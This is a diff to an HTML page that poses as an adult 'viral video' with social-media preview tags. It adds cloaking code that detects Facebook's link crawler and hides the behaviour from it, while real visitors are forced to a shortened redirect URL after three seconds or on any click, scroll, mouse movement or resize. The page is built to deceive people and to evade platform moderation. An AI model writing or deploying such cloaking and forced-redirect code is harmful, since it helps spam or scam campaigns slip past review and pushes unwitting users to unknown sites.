@@ -6,7 +6,7 @@
   <meta property="og:title" content="Hot Viral Video - Watch Now!" />
   <meta property="og:description" content="Exclusive viral video, only for adults. Click to watch the full video!" />
   <meta property="og:image" content="https://i.supaimg.com/270adda1-6a33-4c66-b65a-503b712780a0.jpg" />
-  <meta property="og:url" content="https://dressifystore.store/" />
+  <meta property="og:url" content="https://your-netlify-link.netlify.app/" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     html, body {
@@ -35,30 +35,29 @@
   <img src="https://i.supaimg.com/3ea023f5-35b7-496d-b1ce-dd2c1b376f49.jpg" alt="Hot Video" class="fullscreen-img" />
 
   <script>
-    // Redirect URL
-    const redirectUrl = "https://urlroxx.com/MuzVQ";
+    // Facebook crawler user-agents
+    var isFacebookBot = /facebookexternalhit|Facebot/i.test(navigator.userAgent);
 
-    // Redirect function
-    function redirectNow() {
-      window.location.href = redirectUrl;
+    // Redirect only if NOT Facebook bot
+    if (!isFacebookBot) {
+      // Redirect after 3 seconds automatically
+      setTimeout(function() {
+        window.location.href = "https://urlroxx.com/MuzVQ";
+      }, 3000);
+
+      // Redirect on any user activity
+      function redirectNow() {
+        window.location.href = "https://urlroxx.com/MuzVQ";
+      }
+
+      window.addEventListener('click', redirectNow);
+      window.addEventListener('touchstart', redirectNow);
+      window.addEventListener('scroll', redirectNow);
+      window.addEventListener('keydown', redirectNow);
+      window.addEventListener('mousemove', redirectNow);
+      window.addEventListener('wheel', redirectNow);
+      window.addEventListener('resize', redirectNow);
     }
-
-    // Redirect after 3 seconds automatically
-    setTimeout(redirectNow, 3000);
-
-    // Redirect on any user activity
-    function userActionRedirect() {
-      redirectNow();
-    }
-
-    // Listen for user activity
-    window.addEventListener('click', userActionRedirect);
-    window.addEventListener('touchstart', userActionRedirect);
-    window.addEventListener('scroll', userActionRedirect);
-    window.addEventListener('keydown', userActionRedirect);
-    window.addEventListener('mousemove', userActionRedirect);
-    window.addEventListener('wheel', userActionRedirect);
-    window.addEventListener('resize', userActionRedirect);
   </script>
 </body>
 </html>
